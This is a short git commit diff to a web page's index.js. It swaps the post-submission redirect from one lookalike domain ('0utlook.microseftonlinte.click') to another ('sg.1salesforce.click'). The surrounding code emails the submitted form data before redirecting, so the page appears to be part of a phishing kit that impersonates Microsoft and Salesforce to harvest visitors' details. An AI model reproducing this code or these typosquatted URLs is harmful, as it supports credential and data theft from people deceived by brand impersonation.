92c7ae5c5e8108bb52cf3b09bb6212ac4aa94053
husknet <127146284+husknet@users.noreply.github.com>
2024-10-09 09:54:45 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://0utlook.microseftonlinte.click';
+        window.location.href = 'https://sg.1salesforce.click';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
